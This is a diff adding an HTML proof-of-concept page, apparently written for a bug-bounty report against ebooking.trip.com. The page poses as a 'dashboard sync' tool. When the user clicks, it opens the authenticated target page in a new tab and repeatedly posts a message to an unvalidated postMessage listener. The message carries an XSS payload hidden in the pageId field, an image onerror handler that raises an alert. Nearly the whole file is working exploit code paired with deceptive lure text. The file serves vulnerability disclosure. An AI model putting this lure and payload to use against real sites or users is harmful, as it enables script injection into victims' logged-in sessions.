@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Different postMessage Handler and JavaScript File Than Report #3812728</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f8f9fa; }
+        .card { max-width: 500px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .btn { padding: 15px 30px; font-size: 16px; color: white; background-color: #007bff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>E-Booking Dashboard Sync</h2>
+    <p>Click below to open your trip.com merchant roster and synchronize your active sessions.</p>
+    <!-- The user interaction allows us to bypass the browser popup blocker and open a tab -->
+    <button class="btn" id="start-sync">Synchronize Dashboard</button>
+</div>
+
+<script>
+    /*
+     * NOTE: This is a different PoC from report number 3812728.
+     * This file targets the second unvalidated window.message listener handling state configuration parameters.
+     */
+
+    document.getElementById('start-sync').addEventListener('click', () => {
+        // 1. Open the target authenticated page in a NEW TAB
+        // Lax cookies are fully attached here because it is a top-level navigation
+        const targetTab = window.open("https://ebooking.trip.com/user/setting", "_blank");
+
+        // 2. Start a polling loop to inject the payload into the tab as it loads
+        let attempts = 0;
+        const interval = setInterval(() => {
+            attempts++;
+            
+            // Stop trying after 50 attempts (~5 seconds) to keep the script efficient
+            if (attempts > 50) {
+                clearInterval(interval);
+            }
+
+            try {
+                // Construct the payload matching the unprotected mountScenarioTrainingNotify listener
+                targetTab.postMessage({
+                    messageType: "mountScenarioTrainingNotify",
+                    pageId: "INJECTED_XSS_PAGE_ID_TEST_<img src=x onerror=alert(XSS Confirmed)>",
+                    sceneKeys: ["INJECTED_SCENE_KEY_1", "INJECTED_SCENE_KEY_2"]
+                }, "*"); // Targeting any origin (*) due to lack of origin validation
+            } catch (e) {
+                // Fail silently while the tab is resolving cross-origin loading states
+            }
+        }, 100); // Check every 100 milliseconds
+    });
+</script>
+
+</body>
+</html>
